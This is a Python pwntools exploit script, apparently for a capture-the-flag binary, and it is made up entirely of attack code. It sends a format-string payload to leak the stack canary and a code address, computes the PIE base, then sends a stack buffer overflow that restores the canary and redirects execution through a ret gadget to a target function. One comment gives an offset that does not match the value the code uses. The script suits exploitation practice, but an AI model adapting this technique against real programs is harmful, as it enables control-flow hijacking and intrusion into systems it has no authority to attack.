from pwn import *

context.log_level = 'debug'

# Static address found using radare2
static_global_dtor_addrs = 0x3d78
static_interesting_fun_addrs = 0x1310
static_ret_addrs = 0x101a


#### For local
p = process(['./ld-linux-x86-64.so.2', './test1'], env={"LD_PRELOAD": "./libc.so.6"})

#### For remote
# p = remote('localhost', 7003) 

# Leak canary and dynamic_global_dtor_addrs
p.recvuntil('flag')

payload = "%x"*43 + " %lX " + "%x"*10 + " %lX "
while len(payload) < 198:
    payload += "." 

print(payload)
p.sendline(payload)

p.recvuntil('said: ')
response = p.recvline()
print(response)

canary = int(response.split(b" ")[1], 16)
dynamic_global_dtor_addrs = int(response.split(b" ")[3], 16)
print(f'canary: {hex(canary)}')
print(f'dynamic_global_dtor_addrs: {hex(dynamic_global_dtor_addrs)}')

# Calculate base address
base_address = dynamic_global_dtor_addrs - static_global_dtor_addrs

# 0x12aa is the offset of interesting function in the binary
fun_addrs = static_interesting_fun_addrs + base_address
print(f'Adress of interesting fun : {hex(fun_addrs)}')

print(f'Base address: {hex(base_address)}')

# Address of ret
ret = base_address + static_ret_addrs

# Payload
payload = 24*b"A" + 8*b"." + 200*b"B" + 48*b"C" + p64(canary) + 8*b"." + p64(ret) + p64(fun_addrs)

p.recvuntil('interesting?')
p.sendline(payload)
p.interactive()
